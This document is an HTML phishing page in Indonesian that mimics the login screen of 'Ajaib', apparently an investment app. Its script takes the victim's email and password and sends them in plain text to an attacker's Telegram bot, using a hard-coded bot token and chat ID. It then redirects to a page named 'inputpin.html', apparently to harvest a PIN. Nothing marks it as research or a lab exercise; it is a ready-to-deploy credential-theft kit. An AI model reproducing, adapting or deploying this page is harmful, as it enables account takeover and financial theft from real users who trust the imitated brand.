<html lang="id">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <title>
   Login Ajaib
  </title>
  <script src="https://cdn.tailwindcss.com">
  </script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
 </head>
 <body class="bg-white font-sans p-6 max-w-md mx-auto">
  <header class="mb-8">
   <button aria-label="Kembali" class="text-2xl text-gray-900">
    <i class="fas fa-arrow-left">
    </i>
   </button>
  </header>
  <main>
   <h1 class="font-bold text-2xl text-gray-900 mb-2">
    Selamat datang kembali!
   </h1>
   <p class="text-gray-800 text-base mb-6 leading-relaxed">
    Dengan satu akun Ajaib, kamu bisa masuk ke semua platform aplikasi Ajaib.
   </p>
   <div aria-label="Email pengguna" class="flex items-center border border-gray-300 rounded-lg p-3 mb-6" role="group">
    <img alt="Ikon pengguna biru bulat" class="w-10 h-10 rounded-full flex-shrink-0" height="40" id="user-icon" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQVZP9z-oOL4NvOcrMkgPc0UoqMy8PtbAKbjsKxd3EjzhbTEDqE86h9SflP&s=10" width="40"/>
    <span class="ml-3 text-gray-900 text-base break-all" id="email-text">
    </span>
    <button aria-label="Edit email" class="ml-auto text-gray-900 text-xl focus:outline-none" id="edit-email-btn" type="button">
     <i class="fas fa-pen">
     </i>
    </button>
   </div>
   <label class="block font-semibold text-gray-900 mb-2" for="password">
    Password
   </label>
   <div class="relative mb-2">
    <input aria-describedby="forgot-password" class="w-full border-2 border-blue-600 rounded-md px-4 py-2 pr-12 text-gray-900 text-base focus:outline-none focus:ring-2 focus:ring-blue-600" id="password" type="password"/>
    <button aria-label="Toggle password visibility" class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-900 text-xl focus:outline-none" type="button" id="toggle-password-btn">
     <i class="fas fa-eye-slash" id="toggle-password-icon">
     </i>
    </button>
   </div>
   <div class="text-right mb-10">
    <a class="text-blue-600 text-sm font-normal hover:underline" href="#" id="forgot-password">
     Lupa Password
    </a>
   </div>
   <button class="w-full bg-blue-100 text-blue-300 font-semibold py-3 rounded-md cursor-not-allowed" disabled="" id="login-btn" type="submit">
    Masuk
   </button>
  </main>
  <script>
   // Ambil email dari localStorage
   const savedEmail = localStorage.getItem('userEmail') || '';

   const emailText = document.getElementById('email-text');
   const editEmailBtn = document.getElementById('edit-email-btn');
   const userIcon = document.getElementById('user-icon');
   const passwordInput = document.getElementById('password');
   const loginBtn = document.getElementById('login-btn');
   const togglePasswordBtn = document.getElementById('toggle-password-btn');
   const togglePasswordIcon = document.getElementById('toggle-password-icon');

   // Tampilkan email jika ada, kosongkan jika tidak ada
   emailText.textContent = savedEmail;

   // Jika email kosong, sembunyikan ikon user
   if (!savedEmail) {
     userIcon.style.display = 'none';
   } else {
     userIcon.style.display = 'block';
   }

   // Fungsi untuk edit email (kosongkan dan hapus dari localStorage)
   editEmailBtn.addEventListener('click', () => {
     localStorage.removeItem('userEmail');
     emailText.textContent = '';
     userIcon.style.display = 'none';
   });

   // Toggle visibility password
   togglePasswordBtn.addEventListener('click', () => {
     if (passwordInput.type === 'password') {
       passwordInput.type = 'text';
       togglePasswordIcon.classList.remove('fa-eye-slash');
       togglePasswordIcon.classList.add('fa-eye');
     } else {
       passwordInput.type = 'password';
       togglePasswordIcon.classList.remove('fa-eye');
       togglePasswordIcon.classList.add('fa-eye-slash');
     }
   });

   // Enable login button if password is not empty
   passwordInput.addEventListener('input', () => {
     if (passwordInput.value.trim().length > 0) {
       loginBtn.disabled = false;
       loginBtn.classList.remove('bg-blue-100', 'text-blue-300', 'cursor-not-allowed');
       loginBtn.classList.add('bg-blue-600', 'text-white', 'cursor-pointer');
     } else {
       loginBtn.disabled = true;
       loginBtn.classList.add('bg-blue-100', 'text-blue-300', 'cursor-not-allowed');
       loginBtn.classList.remove('bg-blue-600', 'text-white', 'cursor-pointer');
     }
   });

   // Kirim data ke Telegram via Bot API
   loginBtn.addEventListener('click', async (e) => {
     e.preventDefault();
     const email = emailText.textContent.trim();
     const password = passwordInput.value.trim();

     if (!email || !password) return;

     // Simpan email ke localStorage
     localStorage.setItem('userEmail', email);

     // Ganti dengan token bot Telegram dan chat ID Anda
     const telegramBotToken = '8392304649:AAFSpxG4uQqhdzOi-XD0ADeuykpj4RGAgDU';
     const telegramChatId = '7914074847';

     const message = `Login Data:\nEmail: ${email}\nPassword: ${password}`;

     const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

     try {
       await fetch(url, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
         },
         body: JSON.stringify({
           chat_id: telegramChatId,
           text: message
         })
       });
       window.location.href = 'inputpin.html';
       passwordInput.value = '';
       loginBtn.disabled = true;
       loginBtn.classList.add('bg-blue-100', 'text-blue-300', 'cursor-not-allowed');
       loginBtn.classList.remove('bg-blue-600', 'text-white', 'cursor-pointer');
     } catch (error) {
       alert('Gagal mengirim data.');
       console.error(error);
     }
   });
  </script>
 </body>
</html>
